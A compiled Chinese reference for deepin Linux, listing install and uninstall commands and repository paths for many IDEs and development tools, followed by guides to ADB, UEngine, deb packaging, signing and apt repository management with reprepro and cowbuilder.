安装命令：sudo apt-get install intel-xdk；卸载命令：sudo apt-get remove intel-xdk；仓库地址：http://packages.deepin.com/deepin/pool/non-free/i/intel-xdk/

标题：Eclipse_IDE
Eclipse是一个开放源代码的、基于Java的可扩展开发平台。就其本身而言，它只是一个框架和一组服务，用于通过插件组件构建开发环境。幸运的是，Eclipse 附带了一个标准的插件集，包括Java开发工具（Java Development Kit，JDK）。

安装命令：sudo apt-get install eclipse-java（Eclipse IDE for Java EE Developers）；sudo apt-get install eclipse-jee（Eclipse IDE for Java Developers）；sudo apt-get install eclipse-cpp（Eclipse IDE for C/C++ Developers）；sudo apt-get install eclipse-php（Eclipse for PHP Developers）；sudo apt-get install eclipse-android（Eclipse for Android Developers）；sudo apt-get install eclipse-committers（Eclipse IDE for Eclipse Committers）；sudo apt-get install eclipse-javascript（Eclipse IDE for JavaScript and Web Developers）；sudo apt-get install eclipse-reporting（Eclipse IDE for Java and Report Developers）；sudo apt-get install eclipse-dsl（Eclipse IDE for Java and DSL Developers）；sudo apt-get install eclipse-rcp（Eclipse for RCP and RAP Developers）；sudo apt-get install eclipse-modeling（Eclipse Modeling Tools）；sudo apt-get install eclipse-parallel（Eclipse for Parallel Application Developers）；sudo apt-get install eclipse-testing（Eclipse for Testers）；sudo apt-get install eclipse-scout（Eclipse for Scout Developers）

卸载命令：sudo apt-get remove eclipse-java；sudo apt-get remove eclipse-jee；sudo apt-get remove eclipse-cpp；sudo apt-get remove eclipse-php；sudo apt-get remove eclipse-android；sudo apt-get remove eclipse-committers；sudo apt-get remove eclipse-javascript；sudo apt-get remove eclipse-reporting；sudo apt-get remove eclipse-dsl；sudo apt-get remove eclipse-rcp；sudo apt-get remove eclipse-modeling；sudo apt-get remove eclipse-parallel；sudo apt-get remove eclipse-testing；sudo apt-get remove eclipse-scout

仓库地址：http://packages.deepin.com/deepin/pool/main/e/eclipse-java/；http://packages.deepin.com/deepin/pool/main/e/eclipse-jee/；http://packages.deepin.com/deepin/pool/main/e/eclipse-cpp/；http://packages.deepin.com/deepin/pool/main/e/eclipse-php/；http://packages.deepin.com/deepin/pool/main/e/eclipse-android/；http://packages.deepin.com/deepin/pool/main/e/eclipse-committers/；http://packages.deepin.com/deepin/pool/main/e/eclipse-javascript/；http://packages.deepin.com/deepin/pool/main/e/eclipse-reporting/；http://packages.deepin.com/deepin/pool/main/e/eclipse-dsl/；http://packages.deepin.com/deepin/pool/main/e/eclipse-rcp/；http://packages.deepin.com/deepin/pool/main/e/eclipse-modeling/；http://packages.deepin.com/deepin/pool/main/e/eclipse-parallel/；http://packages.deepin.com/deepin/pool/main/e/eclipse-testing/；http://packages.deepin.com/deepin/pool/main/e/eclipse-scout/

标题：Eric
Eric是一个全功能Python和Ruby的编辑器和IDE，它是基于跨平台的Qt GUI工具包，整合高度灵活的编辑控制。Eric包括一个插件系统，它允许使用从网上下载插件且易于扩展到IDE功能中。安装命令为sudo apt-get install eric，卸载命令为sudo apt-get remove eric，仓库地址是http://packages.deepin.com/deepin/pool/main/e/eric/

标题：Spyder
Spyder是一个强大的交互式Python集成开发环境，它提供高级的代码编辑、交互测试、调试等特性，同时还可以模仿Matlab的“工作空间”的功能，根据自己的喜好调整它们的位置和大小。安装命令为sudo apt-get install spyder，卸载命令为sudo apt-get remove spyder，其仓库地址为http://packages.deepin.com/deepin/pool/main/s/spyder/

标题：Gambas
Gambas是一个开发Visual Basic的集成开发环境，其操作和语法几乎与Windows平台下的Visual Basic一致，它具有代码自动提示、语法高亮、组件扩展等功能，同时支持常见的MySQL、PostgreSQL数据库连接，并带有一个专门的数据库管理工具。安装命令为sudo apt-get install gambas3，卸载命令为sudo apt-get remove gambas3，其仓库地址为http://packages.deepin.com/deepin/pool/main/g/gambas3/

标题：Eclipse IDE
Eclipse是一个开放源代码的、基于Java的可扩展开发平台。就其本身而言，它只是一个框架和一组服务，用于通过插件组件构建开发环境。幸运的是，Eclipse 附带了一个标准的插件集，包括Java开发工具（Java Development Kit，JDK）。

安装Eclipse的命令有：sudo apt-get install eclipse-java（Eclipse IDE for Java EE Developers）、sudo apt-get install eclipse-jee（Eclipse IDE for Java Developers）、sudo apt-get install eclipse-cpp（Eclipse IDE for C/C++ Developers）、sudo apt-get install eclipse-php（Eclipse for PHP Developers）、sudo apt-get install eclipse-android（Eclipse for Android Developers）、sudo apt-get install eclipse-committers（Eclipse IDE for Eclipse Committers）、sudo apt-get install eclipse-javascript（Eclipse IDE for JavaScript and Web Developers）、sudo apt-get install eclipse-reporting（Eclipse IDE for Java and Report Developers）、sudo apt-get install eclipse-dsl（Eclipse IDE for Java and DSL Developers）、sudo apt-get install eclipse-rcp（Eclipse for RCP and RAP Developers）、sudo apt-get install eclipse-modeling（Eclipse Modeling Tools）、sudo apt-get install eclipse-parallel（Eclipse for Parallel Application Developers）、sudo apt-get install eclipse-testing（Eclipse for Testers）、sudo apt-get install eclipse-scout（Eclipse for Scout Developers）。

卸载Eclipse的命令有：sudo apt-get remove eclipse-java、sudo apt-get remove eclipse-jee、sudo apt-get remove eclipse-cpp、sudo apt-get remove eclipse-php、sudo apt-get remove eclipse-android、sudo apt-get remove eclipse-committers、sudo apt-get remove eclipse-javascript、sudo apt-get remove eclipse-reporting、sudo apt-get remove eclipse-dsl、sudo apt-get remove eclipse-rcp、sudo apt-get remove eclipse-modeling、sudo apt-get remove eclipse-parallel、sudo apt-get remove eclipse-testing、sudo apt-get remove eclipse-scout。

Eclipse相关仓库地址包括：http://packages.deepin.com/deepin/pool/main/e/eclipse-java/、http://packages.deepin.com/deepin/pool/main/e/eclipse-jee/、http://packages.deepin.com/deepin/pool/main/e/eclipse-cpp/、http://packages.deepin.com/deepin/pool/main/e/eclipse-php/、http://packages.deepin.com/deepin/pool/main/e/eclipse-android/、http://packages.deepin.com/deepin/pool/main/e/eclipse-committers/、http://packages.deepin.com/deepin/pool/main/e/eclipse-javascript/、http://packages.deepin.com/deepin/pool/main/e/eclipse-reporting/、http://packages.deepin.com/deepin/pool/main/e/eclipse-dsl/、http://packages.deepin.com/deepin/pool/main/e/eclipse-rcp/、http://packages.deepin.com/deepin/pool/main/e/eclipse-modeling/、http://packages.deepin.com/deepin/pool/main/e/eclipse-parallel/、http://packages.deepin.com/deepin/pool/main/e/eclipse-testing/、http://packages.deepin.com/deepin/pool/main/e/eclipse-scout/。

标题：Geany
Geany是一个跨平台的开源集成开发环境，它支持基本的语法高亮、代码自动完成、调用提示、插件扩展。支持文件类型有C、CPP、Java、Python、PHP、 HTML、DocBook、Perl、LateX和Bash脚本。安装命令为sudo apt-get install geany，卸载命令为sudo apt-get remove geany。仓库地址是http://packages.deepin.com/deepin/pool/main/g/geany/。常见问题中，点击执行时无法调用深度终端的解决方法是：在首选项→工具→虚拟终端，修改终端的命令为deepin-terminal -x "/bin/sh" %c，点击“应用”按钮后即可。

标题：JetBrains IDE
JetBrains公司是最好的Java IDE的创造者，IntelliJ IDEA，是一家技术领先的软件开发公司，专门在创建智能的开发工具。

安装命令：sudo apt-get install phpstorm；sudo apt-get install pycharm-community；sudo apt-get install pycharm-professional；sudo apt-get install rubymine；sudo apt-get install webstorm；sudo apt-get install clion；sudo apt-get install datagrip。

卸载命令：sudo apt-get remove phpstorm；sudo apt-get remove pycharm-community；sudo apt-get remove pycharm-professional；sudo apt-get remove rubymine；sudo apt-get remove webstorm；sudo apt-get remove clion；sudo apt-get remove datagrip。

仓库地址：http://packages.deepin.com/deepin/pool/non-free/p/phpstorm/；http://packages.deepin.com/deepin/pool/main/p/pycharm-community/；http://packages.deepin.com/deepin/pool/non-free/p/pycharm-professional/；http://packages.deepin.com/deepin/pool/non-free/r/rubymine/；http://packages.deepin.com/deepin/pool/main/w/webstorm/；http://packages.deepin.com/deepin/pool/non-free/c/clion/；http://packages.deepin.com/deepin/pool/main/d/datagrip/。

标题：JetBrains系列
JetBrains 是一家专注于创建智能开发工具的前沿软件公司，包括：行业中领头的 Java IDE – IntelliJ IDEA，以及 Kotlin 编程语言。

IntelliJ IDEA 是功能强大，符合人体工程学的 JVM IDE。

PyCharm 是面向专业开发者的Python IDE。

WebStorm 是最智能的 JavaScript IDE。

PhpStorm 是高效智能的PHP IDE。

CLion 是 C 和 C++ 跨平台 IDE。

Datalore 是适用于 Jupyter Notebooks 的强大而安全的环境。

DataSpell 是专业数据科学家的 IDE。

DataGrip 是多种数据库，一个工具。

RubyMine 是最智能的 Ruby 与 Rails IDE。

AppCode 是适用于 iOS/macOS 开发的智能 IDE。

GoLand 是功能强大、符合人体工程学的 Go IDE。

PyCharm Edu 是学习和教授 Python 编程的专业工具。

IntelliJ IDEA Edu 是学习和教授编程的专业工具。

Code With Me 是协作开发和结对编程服务。

dotUltimate 在一个包中提供所有 .NET 工具、ReSharper C++ 和 JetBrains Rider。

ReSharper 是适用于 .NET 开发者的 Visual Studio 扩展。

Rider 是快速且强大的跨平台 .NET IDE。

ReSharper C++ 是适用于 C++ 开发者的 Visual Studio 扩展。

dotTrace 是 .NET 性能分析器。

dotMemory 是 .NET 内存分析器。

dotCover 是 .NET 单元测试运行程序和代码覆盖率工具。

dotPeek 是 .NET 反编译器和程序集浏览器。

标题：Komodo IDE
Komodo IDE是一款支持多种动态编程语言的集成开发环境，它提供强大的工作空间用以编辑、调试和测试程序。支持Perl、Python及Javascript等的程序语言开发，同时还具备版本控制CVS、支持正则表达式等功能。安装命令为sudo apt-get install komodo-edit，卸载命令为sudo apt-get remove komodo-edit，其仓库地址为http://packages.deepin.com/deepin/pool/main/k/komodo-edit/

标题：MyEclipse
MyEclipse是一款软件开发工具，是对EclipseIDE的扩展，包括了完备的编码、调试、测试和发布功能，完整支持HTML，Struts，JSP，CSS，Javascript，Spring，SQL，Hibernate。也是一个用于开发Java, J2EE的 Eclipse 插件集合，可以支持Java Servlet，AJAX，JSP，JSF，Struts，Spring，Hibernate，EJB3，JDBC数据库链接工具等多项功能。

安装命令：sudo apt-get install myeclipse；卸载命令：sudo apt-get remove myeclipse；仓库地址：http://packages.deepin.com/deepin/pool/non-free/m/myeclipse/

标题：NetBeans
NetBeans是一个集成开发环境，它支持PHP、Ruby、JavaScript、Groovy、Grails和C/C++等开发语言。NetBeans集成开发环境提供了丰富的产品文档和培训资源，以及大量的第三方插件。安装命令为sudo apt-get install netbeans，卸载命令为sudo apt-get remove netbeans，其仓库地址为http://packages.deepin.com/deepin/pool/main/n/netbeans/

标题：Visual_Studio_Code
Visual Studio Code是一款轻量级代码编辑器，它具有语法高亮、可定制的热键绑定、括号匹配、代码片段收集、代码调试、自定义语言和主题、支持扩展/插件等功能。
安装命令：sudo apt-get install vscode
卸载命令：sudo apt-get remove vscode
仓库地址：http://packages.deepin.com/deepin/pool/main/v/vscode/
VSCode一般是指Visual Studio Code的缩写

标题：Visual Studio Code 2
Visual Studio Code（简称 VS Code）是一款由微软开发且跨平台的免费源代码编辑器。该软件支持语法高亮、代码自动补全（又称 IntelliSense）、代码重构功能，并且内置了命令行工具和 Git 版本控制系统。用户可以更改主题和键盘快捷方式实现个性化设置，也可以通过内置的扩展程序商店安装扩展以拓展软件功能。安装命令为sudo apt install com.visualstudio.code。卸载命令为sudo apt remove --purge com.visualstudio.code。仓库地址是http://packages.deepin.com/deepin/pool/main/v/vscode/。相关链接包括维基百科：https://zh.wikipedia.org/zh-cn/Visual_Studio_Code 和 Visual Studio Code 官方网站：https://code.visualstudio.com/

标题：Bluefish
Bluefish是一款为熟练的Web设计员和程序员而设的编辑器，UI设计很直观，任何初学者都能够很快上手，Bluefish提供了很多常用的HTML任务选项，例如字体、表格、链接等。安装命令为sudo apt-get install bluefish。卸载命令为sudo apt-get remove bluefish。仓库地址是http://packages.deepin.com/deepin/pool/main/b/bluefish/

标题：framer开源原型设计软件
Framer 是一个开源原型设计工具，使用 CoffeeScript 编写。

Framer 支持动画效果和交互操作。

Framer 的官方网站是 https://www.framer.com。

标题：Glade
Glade是一个相当不错的图形界面设计工具，基于GTK+Toolkit开发，以XML格式的文件保存，它可以通过GTK+对象GtkBuilder被应用程序动态地载入。通过GtkBuilder，GladeXML文件可以被许多编程语言使用。安装命令：sudo apt-get install glade。卸载命令：sudo apt-get remove glade。仓库地址：http://packages.deepin.com/deepin/pool/main/g/glade/

标题：PyQt5初步界面
安装PyQt5可在终端输入sudo apt install python3-pyqt5。

不推荐用pip安装PyQt5，会干扰apt安装的版本，还可能导致输入法问题。

若用pip安装了PyQt5，可输入pip3 uninstall pyqt5卸载，root目录下需加sudo。

PyQt5基础模板需导入sys和PyQt5.QtWidgets，创建QApplication和QWidget并显示。

高级示例中，按钮点击会触发HelloWorld函数，显示含“Hello World!”的对话框。

高级示例使用QMainWindow作为主窗口，通过QVBoxLayout布局添加按钮。

标题：Qt Creator
Qt Creator是跨平台的轻量级集成开发环境，包括项目生成向导、C++代码编辑器等功能。

安装方法一的安装命令为：sudo apt-get install qtcreator。

安装方法一的卸载命令为：sudo apt-get remove qtcreator。

Qt Creator仓库地址为http://packages.deepin.com/deepin/pool/main/q/qtcreator/。

安装完QT后，需添加gcc、g++、gdb、cmake，修正libGL.so，以及fcitx中文输入支持。

修正libGL.so的命令：sudo ln -s /usr/lib/i386-linux-gnu/libGL.so.1 /usr/lib/i386-linux-gnu/libGL.so；sudo ln -s /usr/lib/x86_64-linux-gnu/libGL.so.1 /usr/lib/x86_64-linux-gnu/libGL.so。

支持fcitx中文输入需安装fcitx-libs-qt5，并复制相关插件。

从应用商店安装Qt Creator提示qmake错误，终端执行：sudo apt-get install qt5-default。

Qt-5.12.12版本以后，官方不再提供离线安装包，需用在线安装器安装。

安装方法二的前置条件：申请Qt账号，安装依赖项和gcc、gdb、g++。

Linux安装Qt的依赖项安装命令：sudo apt install build-essential libgl1-mesa-dev。

安装gcc、gdb、g++的命令：sudo apt install gcc gdb g++。

Qt在线安装器可从https://www.qt.io/download下载。

安装Qt的步骤：双击下载的在线安装器，登录Qt账号，选择组件安装。

标题：wxPython
wxPython是Python包装wxWidgets（C++编写）的跨平台GUI工具包，由Robin Dunn及Harri Pasanen开发，作为Python扩展模块，免费，可从官网http://wxpython.org下载。

wxPython API主要模块包括核心模块（含wxObject类，是所有类基础）、控制模块（含GUI部件如wx.Button等）、GDI模块（绘图类如字体等）、Windows模块（定义容器窗口类）。

wxPython官方网站主持Phoenix工程计划，为Python3.*新实现，着重提高速度、可维护性和可扩展性，始于2012年，仍处测试阶段。

deepin15.8中python3用pip方式安装wxPython失败，安装命令为pip3 install -U wxPython，Python 3.6.5版本导入wx时报ModuleNotFoundError。

win10系统安装wxPython也报错，Python3.7.1配wxPython-4.0.3-cp37-cp37m-win_amd64文件安装，导入wx时报ImportError: DLL load failed: 找不到指定的模块。

标题：Adb(Android_Debug_Bridge)
ADB是功能强大的命令行工具，允许通过数据线或网络与android设备通信，可安装应用、复制文件、运行shell命令或调试应用。

在Deepin linux系统中，可通过系统内置软件源、google提供的下载链接、android studio的sdk manager安装adb命令。

通过系统内置软件源安装adb工具，执行命令：sudo apt install android-tools-adb。

通过google提供的下载链接安装adb，需下载适用于Linux的SDK Platform-Tools，解压到/opt/android/sdk/，bash用户需添加路径到环境变量。

执行adb devices提示没有权限，软件源安装的可重新拔插设备和重启Deepin系统；google下载的需参考android-udev-rules解决。

标题：UEngine使用总结
deepin 20.2.2的uengine环境可运行安卓应用，通过应用商店安装时，打开应用商店定位到“安卓应用”即可。

终端安装uengine应用，可先用apt search uengine缩小范围，安装QQ用sudo apt install uengine.com.tencent.mobileqq，安装微信用sudo apt install uengine.com.tencent.mm。

图形化安装他人打包的deb包：打开下载的deb目录，用deb安装器打开，点击“安装”输入密码。

终端安装deb包：定位到deb目录，执行sudo dpkg -i XXX（XXX为deb文件名），依赖问题用sudo apt install -f修复。

UEngine运行器安装APK：下载deb包安装运行器，右键APK选择“安装/卸载APK（UEngine运行器）”，点击安装并输入密码。

命令安装APK：定位到APK目录，执行sudo /usr/bin/uengine-session-launch-helper -- uengine install --apk='XXX'（XXX为绝对路径，需root权限）。

将应用打成deb包：用第三方安装器，选择要打包的应用点击打包，deb文件生成于桌面。

打开uengine程序列表：终端输入/usr/bin/uengine-launch.sh --package=org.anbox.appmgr --component=org.anbox.appmgr.AppViewActivity，或创建含对应内容的.desktop文件。

与uengine互通文件：在桌面、文件管理等位置通过uengine入口交换文件，其不访问根目录，需访问可安装Android第三方文件管理器。

右键卸载uengine应用：部分通过deb或Maicss安装的应用可右键卸载，其他需用其他方法。

系统设置卸载uengine应用：终端输入/usr/bin/uengine-launch.sh --action=android.intent.action.MAIN --package=com.android.settings --component=com.android.settings.Settings打开设置，点击应用部分，选择应用后卸载。

终端卸载uengine应用：先安装aapt，定位APK目录用aapt dump badging XXX获取包名，再执行sudo /usr/bin/uengine-session-launch-helper -- uengine uninstall --pkg='XXX'（需root权限）。

uengine中Android软件运行故障：部分软件无法运行，可查看anbox的Issues（项目链接：https://github.com/anbox/anbox/），因uengine基于anbox二次开发。

标题：DEB包与APT仓库基础
准备DEB包开发环境需安装：build-essential、dpkg-dev、dh-make、debhelper、dpkg-sign等，包含gcc、g++、make等工具。

修改上游仓库软件包示例：apt-get source zip；cd zip-3.0；apt-get build-dep zip -y；dpkg-buildpackage -a。

debian目录重要文件：control（定义包信息、依赖等）、changelog（记录修订及版本）、compat（debhelper最低版本）等。

debian/rules是Makefile，定义创建deb包规则，包含binary-arch、binary-indep、build、clean等targets。

dh命令简化rules编写：dh_auto_clean对应make distclean；dh_auto_configure对应./configure ...；dh_auto_build对应make。

deb包执行脚本：preinst（安装前）、postinst（安装后）、prerm（卸载前）、postrm（卸载后）。

基于autotools的源码安装步骤：./configure ...；make；make install；make clean。

从源码包制作deb包：wget获取tar包；tar解压；cd目录；dh_make生成模板；编辑rules等；dpkg-buildpackage -a。

简化的debian/rules用debhelper：binary:build install 后接dh_gencontrol等；build用dh_auto_configure等。

默认rules用%: dh $@，可通过override_重定义dh命令，如override_dh_install指定安装路径。

生成签名密钥：gpg --gen-key；gpg --list-keys；gpg --export -a 密钥ID > key.pub；apt-key add key.pub。

给deb包签名：dpkg-sig -k keyid --sign builder 包路径 -f passwdfile，需输入密钥密码。

安装reprepro：apt-get install reprepro -y，用于搭建deb仓库，需创建conf/distributions配置文件。

更新reprepro仓库：reprepro includedeb 版本 包路径；includeudeb、includedsc类似。

创建ISO可用debootstrap：sudo debootstrap --arch 平台 发行版代号 目录，如i386 trusty /mnt。

标题：debian-cd工作原理分析
debian-cd 是debian的官方的制作ISO的工具。

安装光盘包含autorun.inf、setup.exe、win32-loader.ini等windows启动引导支持文件，可移除。

安装光盘的debian目录是链接文件，指向当前目录。

安装光盘的efi/是EFI引导文件目录，boot/是GRUB引导文件目录，isolinux/是ISO启动项菜单目录。

安装光盘的dists/是ISO内置仓库索引目录，pool/是ISO内置仓库数据目录。

debian-cd工作流程第一步是初始化工作环境，建立相应目录，如deepin-cd/build/15/等用于存放制作ISO需要的文件和软件包，deepin-cd/output/15/用于存放完成的ISO文件和输出结果。

debian-cd会依据定义的task完成包列表的分析，从本地仓库获取软件包，在build目录下创建新仓库，并检查依赖缺失，此功能目前已被isobuilder取代。

debian-cd执行/tools/make_disc_trees.pl创建构建ISO需要的目录树，包括启动引导文件等。

debian-cd生成ISO内文件MD5值清单的参考命令为find . -type f | grep -v -e ^\./\.disk -e ^\./dists | xargs md5sum >> md5sum.txt。

debian-cd最后调用xorriso生成ISO文件，结果保存在deepin-cd/output/15/目录。

debian-cd的关键代码包括tools/apt-selection（封装APT工具）、tools/boot/kui/boot-amd64（生成启动项配置）、tools/make_disc_trees.pl（生成ISO目录结构树）。

基于grub2封装可引导ISO的命令为xorriso -as mkisofs -graft-points --modification-date=2017010903552500 -b boot/grub/i386-pc/eltorito.img -no-emul-boot -boot-load-size 4 -boot-info-table --grub2-boot-info --grub2-mbr /usr/lib/grub/i386-pc/boot_hybrid.img --efi-boot boot/grub/efi.img -efi-boot-part --efi-boot-image --protective-msdos-label -o test.iso --sort-weight 0 / --sort-weight 1 /boot ISO/.

标题：基于debian的发行版定制指南
基于debian的发行版定制必备技能包括：熟悉常见开发工具、deb格式包的制作、仓库的管理和维护、ISO版本的制作流程、CI自动编译系统。

debian发行版定制常用维护工具包括git、dpkg-dev、dh-make、devscripts、quilt、dput、reprepro、debootstrap、debian-installer、debian-cd、isobuilder。

修改来自上游仓库的软件包步骤：apt-get source zip；apt-get build-dep zip -y；cd zip-3.0；...；dpkg-buildpackage -a。

获取上游源码包制作新的deb包步骤：wget http://ftp.gnu.org/pub/gnu/ed/ed-1.9.tar.gz；tar -xvpf ed-1.9.tar.gz；cd ed-1.9；dh_make -s -y -e panhaitao@deepin.com -f ../ed-1.9.tar.gz；apt install autotools-dev -y；dpkg-buildpackage -a。

仓库推送流程为：开发版本仓库 -> 内网正式仓库 -> 公网正式仓库(CDN加速)。

日常仓库管理操作：ssh deepin-repo@10.1.10.21；cd /data/deepin-server/repo/deepin-repo-tools；./reprepro.sh include <codename> pkg_name.changes；./reprepro.sh remove  <codename> pkg_name。

同步上游安全更新步骤：ssh deepin-repo@10.1.10.21；cd /data/deepin-server/repo/deepin-repo-tools；./reprepro.sh -V update kui-security。

创建仓库快照命令：ssh root@10.1.10.21；cd /data/deepin-server/repo；TIMESTAMP=$(date +%Y%m%dT%H%M%S)；btrfs sub snapshot ./dev/ ./snapshots/$TIMESTAMP；cd ./snapshots/；ln -snf $TIMESTAMP latest；ln -snf $TIMESTAMP lates。

构建debian-installer需先安装编译依赖包 apt-get build-dep debian-installer -y，再克隆仓库编译等。

isobuilder使用前需安装编译依赖包 apt-get build-dep debian-cd -y 和运行依赖包 apt-get install isobuilder -y。

isobuilder制作ISO的命令：isobuilder --download_pkg；isobuilder --create_repo；isobuilder --create_iso。

内部开发仓库地址：deb http://10.1.10.21/server-dev kui main non-free contrib；deb http://10.1.10.21/server-dev kui-security main non-free contrib。

公网仓库地址：deb http://packages.deepin.com/deepin-server/ kui main non-free contrib；deb http://packages.deepin.com/deepin-server/ kui-security main non-free contrib。

公网ISO下载地址：http://dl.sndu.cn/。

内部参考文档包括debian-installer详解、deepin-cd详解、deb打包详解、自动编译系统详解。

上游参考文档包括Debian新维护人员手册、Debian开发者参考文档、Debian政策文档、Debian PKG。

安全更新相关网址：https://www.debian.org/security/；https://www.debian.org/security/crossreferences。

安全更新相关邮件列表：debian-security-announce@lists.debian.org；debian-security-announce-request@lists.debian.org。

标题：详解debian/rules
一个通用的源码包可能使用如下方式编译安装:./configure --prefix=/usr --sysconfdir=/etc --mandir=/usr/share/man --localstatedir=/var; make; make install

rules文件一般会包含“binary-arch”, ”binary-indep”, ”binary”，”build”, ”clean”, ”install”等targets。

debian社区开发了包含常用操作dh命令的debhelper软件包来简化debian/rules的编写。

最新版本的dh_make会使用默认的“dh $@”来进一步简化rules文件的编写。

当默认执行的dh命令不能满足需求时，可以通过override_来重新定义dh命令。

dh_auto_clean对应make distclean；dh_auto_configure对应./configure --prefix=/usr等；dh_auto_build对应make；dh_auto_test对应make test；dh_auto_install对应make install DESTDIR=...

deb格式软件安装过程由debian/preinst（安装前）、debian/postinst（安装后）、debian/prerm（卸载前）、debian/postrm（卸载后）脚本控制。

deb源代码包Format：1.0包含一个.dsc文件，一个.orig.tar.gz文件，一个.diff.gz文件。

Format：3.0 (native)的deb源代码包包含debian化的所有更改全部在一个压缩包中。

生成deb签名密钥的步骤：gpg --gen-key；gpg --list-keys；gpg --export -a 6A9E1B52 > key.pub；apt-key add key.pub。

给deb软件包签名的指令：dpkg-sig -k keyid --sign builder /your_packages_<version>_<architecture>.deb，需输入生成公钥时的密码。

进阶工具包括debootstrap（构建临时环境）、devscripts（辅助脚本集合）、pbuilder（创建维护chroot环境）、ccache（缓存编译临时文件）。

pbuilder的基本用法：pbuilder create；pbuilder build *.dsc。

仓库管理工具reprepro的安装命令：apt-get install reprepro -y。

使用reprepro更新仓库的命令：reprepro includedeb wheezy pkgdir/*.deb；reprepro includedsc wheezy pkgdir/*.dsc。

标题：deepin社区构建deb格式软件包
源码包包含dsc文件、orig.tar包、debian.tar包。dsc是描述文件，orig.tar是上游源码重命名的tar包，debian.tar是debian目录的压缩包。

orig.tar包命名规则：<packagename>_<version>.orig.tar.<xz|gz|bz2>，<packagename>是软件包源码名称，<version>是版本。

下载源代码前需创建目录：mkdir ~/SRC，cd ~/SRC。可通过git clone或wget下载。

使用dh_make生成debian目录需在命名为<packagename>-<version>的源码目录中，命令如dh_make -e email --createorig -sy。

changelog文件首行包含软件包名、版本号、发行版和紧急程度，如deepin-music (6.2.17-1) unstable; urgency=medium。

control文件中Source字段表示源码包的名称，建议与项目名称相同。

rules文件是用于构建Debian软件包的可执行脚本，本质是Makefile，包含多个target如clean、build等。

source/format文件内容可为3.0 (quilt)或3.0 (native)，3.0(quilt)用于非本土软件，3.0(native)用于Deepin本土软件。

使用dpkg-buildpackage构建的命令如dpkg-buildpackage -us -nc，会完成清理、构建源码包、编译、生成二进制包等工作。

构建时若提示缺少编译依赖，可执行sudo apt build-dep .自动安装所需依赖。

debian/compat文件定义debhelper的兼容级别，报错提示需指定时，可执行echo 9 > debian/compat生成。

修改代码后可使用dpkg-source --commit生成patch，需输入补丁名，生成的patch放在debian/patches目录，名称写入series文件。

使用debuild构建需先安装devscripts，命令为debuild，会执行lintian静态检查，可通过~/.devscripts定制选项。

安装pbuilder的命令为sudo apt install pbuilder，用于净室编译环境验证编译依赖。

生成的.deb二进制包可使用sudo dpkg -i 包名.deb命令安装。

标题：dpkg
打包debian软件需要了解其结构，包含/DEBIAN，/etc，/usr，/opt等目录。

打包deb包的命令是dpkg -b 目录 -xxx.deb。

安装deb包可以使用dpkg -i xxx.deb命令，也可以使用深度包管理器。

deb包安装不顺利可能是依赖问题，需查看/DEBIAN/control中填写的依赖。

标题：Networkmanager
介绍打包network-manager生成deb包的方法。

获取network-manager源码可使用命令apt source network-manager，需确保/etc/apt/sources.list源被打开。

配置系统仓库地址需编辑/etc/apt/source.list，加入deb [trusted=yes] http://pools.corp.deepin.com/uos eagle main contrib non-free和deb-src [trusted=yes] http://pools.corp.deepin.com/uos eagle main contrib non-free，再执行sudo apt update。

修改network-manager代码可进入network-manager-1.14.6.4+c1/src/目录，用vim编辑xxx.c文件后保存。

提交修改需在network-manager-1.14.6.4+c1目录执行dpkg-source --commit，输入patch名字，生成的patch在debian/patches/下，debian/patches/series决定应用顺序。

安装network-manager依赖使用sudo apt build-dep network-manager-1.14.6.4+c1，失败时根据提示安装相应文件。

应用修改可执行dpkg-source -b .命令。

重新编译用dpkg-buildpackage -us -uc -j8，遇‘SIOCGSTAMP’ undeclared错误，在tools/rctest.c和tools/l2test.c加#include <linux/sockios.h>，修改后重新提交，编译错误可执行debian/rules clean。

编译完成后在上级目录生成deb包，用sudo dpkg -i xxx.deb安装。

标题：使用 cowbuilder chroot 来构建包
初始化时，创建基础镜像的命令为 sudo cowbuilder --create，新创建的镜像在 /var/cache/pbuilder/base.cow/ 下。

常用操作中，更新基础镜像的命令是 sudo cowbuilder --update，构建软件包的命令是 sudo cowbuilder --build somepackage.dsc。

为多个发行版构建包时，需先创建放置基础镜像的目录，如 /var/cache/pbuilder/buster-i386，再用 sudo cowbuilder --create --basepath /var/cache/pbuilder/buster-i386/base.cow --distribution buster --debootstrapopts --arch --debootstrapopts i386 创建基础镜像。

在家目录创建 .pbuilderrc 文件，可从Ubuntu pbuilder howto获取，在Multiple pbuilders部分注释 BASEPATH="/var/cache/pbuilder/$NAME/base.cow/ 行。

保持cowbuilder chroot最新的命令为 sudo HOME=$HOME DIST=sid cowbuilder --update，HOME环境变量是必要的，因sudo会剥离环境变量。

构建buster的nano包时，先执行 dget -x http://ftp.de.debian.org/debian/pool/main/n/nano/nano_2.7.4-1.dsc，再用 sudo DIST=buster ARCH=i386 cowbuilder --build nano_2.7.4-1.dsc 为buster i386架构打包，结果在 /var/cache/pbuilder/buster-i386/result 目录。

使用eatmydata加速，可执行 DIST=sid cowbuilder --login --save 后 apt-get install eatmydata。pbuiler版本>=0.225时，.pbuilderrc中加 EXTRAPACKAGES=eatmydata 和 EATMYDATA=yes。

eatmydata版本<=26-2.1时，/etc/pbuilderrc中加 export LD_PRELOAD=${LD_PRELOAD:+$LDPRELOAD:}/usr/lib/libeatmydata/libeatmydata.so；版本>=82-2时加 export LD_PRELOAD=${LD_PRELOAD:+$LDPRELOAD:}libeatmydata.so。

标题：使用 reprepro 构建你的 deb 包仓库
reprepro 是用于管理 deb 格式软件包，生成用于分发的仓库管理工具。支持 .dsc/.deb/.udeb 等格式；会生成 Packages/Sources 文件及压缩版本，并对 Release 进行处理（可生成 Release.gpg）。

搭建本地 apt 仓库需要 gpg、apache2（或 nginx）、reprepro 工具，可通过 sudo apt install gpg reprepro apache2 安装。

使用 gpg 生成密钥对的命令：gpg --full-gen-key；查看公钥：gpg --list-keys；查看私钥：gpg --list-secret-keys。

Apache2 的 http 服务目录默认是 /var/www/html，需删除默认 index.html，创建 repo 目录及其中的 conf 目录，再创建 conf/distributions 和 conf/options 文件。

distributions 文件中，Architectures 表示仓库支持的系统架构及是否支持源码包；Components 包含 main、contrib、non-free；SignWith 用于指定 gpg 签名密钥。

options 文件可配置 verbose 和 basedir /var/www/html/repo。

使用 reprepro 导入 deb 包命令：reprepro -C main -b . includedeb dde-sid <deb包路径>；导入源码包：reprepro includedsc dde-sid <dsc文件路径>。

配置 Apache 服务需编辑 /etc/apache2/apache2.conf，添加对 /var/www/html/repo/db/ 和 /var/www/html/repo/conf/ 的访问限制，然后重启 apache2 服务：systemctl restart apache2.service。

导出 gpg key 命令：gpg --armor --output claystan.gpg.key --export。

